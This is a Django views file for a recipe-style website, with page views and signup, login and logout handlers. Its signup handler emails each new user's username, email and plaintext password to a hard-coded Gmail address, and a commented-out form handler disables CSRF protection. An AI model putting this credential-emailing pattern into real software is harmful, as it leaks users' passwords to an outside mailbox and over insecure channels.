from django.shortcuts import render,redirect
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from .models import *
from django.urls import reverse
from django.core.mail import send_mail

# Create your views here.

def home(request):
    l1 = Latest.objects.all()
    t1 = Trending.objects.all()
    return render(request, 'home.html', {'l1': l1, 't1': t1})  

def showLatest(request,id):
    latest=Latest.objects.get(id=id)
    return render(request,'main/showLatest.html',{'latest':latest})

def showTrending(request,id):
    trending=Trending.objects.get(id=id)
    return render(request,'main/showTrending.html',{'trending':trending})

def veg(request):
    return render(request,'main/veg.html')

def nonveg(request):
    return render(request,'main/nonveg.html')

def desserts(request):
    return render(request,'main/desserts.html')

def snacks(request):
    return render(request,'main/snacks.html')

def drinks(request):
    return render(request,'main/drinks.html')

def tiffins(request):
    return render(request,'main/tiffins.html')

def calories(request):
    return render(request,'main/calories.html')


# from django.core.mail import send_mail
# from django.http import JsonResponse
# from django.views.decorators.csrf import csrf_exempt

# @csrf_exempt  # Temporarily disable CSRF protection (use CSRF token for production)
# def submit_form(request):
#     if request.method == "POST":
#         name = request.POST.get("name")
#         email = request.POST.get("email")
#         message = request.POST.get("message")

#         # Email Subject & Body
#         subject = "New Form Submission"
#         email_body = f"Name: {name}\nEmail: {email}\nMessage: {message}"

#         # Send email
#         send_mail(
#             subject,
#             email_body,
#             "nandinikamireddy11@gmail.com",  # Replace with your email (sender)
#             ["nandinikamireddy11@gmail.com.com"],  # Replace with recipient email
#             fail_silently=False,
#         )

#         return JsonResponse({"message": "Form submitted successfully!"})

#     return JsonResponse({"error": "Invalid request"}, status=400)


def signup_view(request):
    if request.method == "POST":
        username = request.POST['username']
        email = request.POST['email']
        password = request.POST['password']

        if User.objects.filter(username=username).exists():
            messages.error(request, "Username already exists!")
            return redirect('main:signup')


        user = User.objects.create_user(username=username, email=email, password=password)
        user.save()
        messages.success(request, "Signup successful! Please log in.")

         # Email Subject & Body
        subject = "New Form Submission"
        email_body = f"Name: {username}\nEmail: {email}\nPassword: {password}"


        # Send email
        send_mail(
            subject,
            email_body,
            "nandinikamireddy11@gmail.com",  # Replace with your email (sender)
            ["nandinikamireddy11@gmail.com.com"],  # Replace with recipient email
            fail_silently=False,
        )

        return redirect('main:login')

    return render(request, 'main/signup.html')


def login_view(request):
    if request.method == "POST":
        username = request.POST['username']
        password = request.POST['password']

        user = authenticate(request, username=username, password=password)

        if user is not None:
            login(request, user)
            return redirect('main:home')  # Change to your homepage
        else:
            messages.error(request, "Invalid credentials!")
            return redirect('main:login')

    return render(request, 'main/login.html')


def logout_view(request):
    logout(request)
    return redirect('main:login')